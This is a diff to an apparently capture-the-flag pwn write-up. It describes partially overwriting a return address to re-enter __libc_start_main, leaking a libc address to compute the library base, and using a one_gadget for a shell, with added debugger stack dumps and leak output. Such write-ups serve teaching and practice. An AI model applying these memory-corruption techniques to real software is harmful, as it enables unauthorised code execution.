@@ -39,11 +39,28 @@ io.sendline(exploit2)
 io.interactive()
 ```
 
-# Partial overwrite -> return to `__libc_start_main` + leak -> one_gadget
+# Process
 
 1. Partially overwrite the return address during the STDIN phase. This changes the least significant byte to be 0x6f. This causes RIP to point to an earlier part of the `__libc_start_main` function- which allows you to get another input (restarting the STDIN phase).
 
+```
+00:0000│ rbp rsp  0x7ffdfaef2890 ◂— 0x0
+01:0008│          0x7ffdfaef2898 —▸ 0x7f03826a10b3 (__libc_start_main+243) ◂— mov    edi, eax
+```
+
+Turns into (at the `ret` instruction of `main()`):
+
+```
+00:0000│ rsp  0x7ffdfaef2898 —▸ 0x7f03826a106f (__libc_start_main+175) ◂— mov    rax, qword ptr fs:[0x300]
+```
+
 2. This gets you the leak for the middle of  `__libc_start_main` which is `0xbf` in the middle of the function. `__libc_start_main` is `0x21ab0` from the base of `glibc` here too. You now have a glibc base address.
+
+```
+[+] libc leak: 0x7f03826a106f
+[+] libc_start_main @ 0x7f03826a0fc0
+[+] libc base: 0x7f038267a000
+```
 
 3. There is a one_gadget in `libc.address + 0x4f322` that can be used, where the requirements are already met:
 
